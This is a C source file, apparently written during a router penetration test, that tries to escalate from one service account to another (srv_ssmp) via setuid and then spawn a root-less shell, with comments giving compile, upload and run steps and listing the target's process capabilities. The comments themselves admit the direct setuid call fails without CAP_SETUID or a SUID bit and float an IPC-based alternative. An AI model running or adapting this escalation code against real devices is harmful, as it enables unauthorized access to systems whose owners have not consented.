#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>

/* 
 * ssmp_shell.c - Escalate to srv_ssmp (UID=3008, GID=2002)
 * Compile: arm-linux-musleabi-gcc -static -o ssmp_shell ssmp_shell.c
 * Upload to /tmp/ssmp_shell on router and run it.
 *
 * This works because:
 * - We are running as srv_clid (UID=3030) with BusyBox shell
 * - ssmp process caps: CapPrm=0x0000000800242400 (CAP_SETUID=7 is set!)
 * - But our shell has CapPrm=0x0 (no caps) 
 * - So we need a SUID binary OR a different approach
 *
 * Alternative: Use /bin/ddnsc which runs as srv_ddns (UID=3054)
 * It's SUID owned by srv_ddns - won't help for srv_ssmp.
 *
 * Real approach: exec a process as srv_ssmp via IPC/socket
 */

int main(int argc, char *argv[]) {
    uid_t target_uid = 3008;  /* srv_ssmp */
    gid_t target_gid = 2002;  /* service group */
    
    printf("[*] Current: UID=%d GID=%d\n", getuid(), getgid());
    printf("[*] Trying to setuid to %d...\n", target_uid);
    
    if (setgid(target_gid) != 0) {
        perror("setgid failed");
    }
    
    if (setuid(target_uid) != 0) {
        perror("setuid failed");
        printf("[-] Cannot setuid to srv_ssmp - no CAP_SETUID\n");
        printf("[-] This binary needs SUID bit or CAP_SETUID capability\n");
        return 1;
    }
    
    printf("[+] SUCCESS! Now running as UID=%d GID=%d\n", getuid(), getgid());
    
    /* Execute shell */
    char *shell_argv[] = {"/bin/sh", NULL};
    char *envp[] = {
        "PATH=/bin:/usr/bin:/sbin:/usr/sbin",
        "HOME=/var/srv_ssmp",
        "USER=srv_ssmp",
        NULL
    };
    
    execve("/bin/sh", shell_argv, envp);
    perror("execve failed");
    return 1;
}
